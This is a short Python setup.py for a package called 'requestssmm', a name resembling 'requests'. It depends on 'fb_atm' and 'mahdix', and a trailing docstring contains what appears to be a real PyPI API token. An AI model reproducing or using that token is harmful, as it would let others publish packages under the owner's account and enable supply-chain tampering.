from setuptools import setup, find_packages

setup(
    name='requestssmm',
    version='0.0.2.1',
    packages=find_packages(),
    install_requires=[
        'requests',  'fb_atm','requests','mahdix'# Replace 'some_dependency' with the actual dependency
    ],
)
"""
pypi-AgEIcHlwaS5vcmcCJGVlNGJhZGM2LTA1ZDItNGMxYS04MWQzLTI4ZDAwNWQxYWI5ZAACKlszLCIyNmY0NzMzMS01OTEzLTRiODQtODQ4MS0zNmU4YzFmNDFjMzciXQAABiBM61PeNHd-rgBN4gaLpt43W7l_eRXM1scFUO6pve5K5g
"""


